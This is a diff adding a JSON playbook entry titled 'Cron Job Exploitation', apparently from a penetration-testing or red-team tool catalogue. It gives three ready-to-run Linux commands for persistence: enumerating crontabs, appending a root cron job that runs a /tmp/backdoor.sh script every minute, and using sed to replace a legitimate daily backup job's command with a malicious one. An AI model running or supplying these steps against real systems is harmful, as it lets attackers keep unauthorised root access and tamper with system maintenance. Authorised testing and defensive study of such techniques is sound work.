@@ -1,0 +1,25 @@
+{
+	"name": "Cron Job Exploitation",
+	"description": "Hijack or create cron jobs for persistence.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "List Cron Jobs",
+			"command": "crontab -l; cat /etc/crontab; ls /etc/cron.*",
+			"description": "User and system crons."
+		},
+		{
+			"index": 2,
+			"name": "Writable Cron Script",
+			"command": "echo '* * * * * /bin/sh /tmp/backdoor.sh' >> /etc/cron.d/pwn",
+			"description": "Add root cron if writable."
+		},
+		{
+			"index": 3,
+			"name": "Modify Existing",
+			"command": "sed -i 's/original_command/malicious_command/g' /etc/cron.daily/backup",
+			"description": "Alter legitimate job."
+		}
+	]
+}
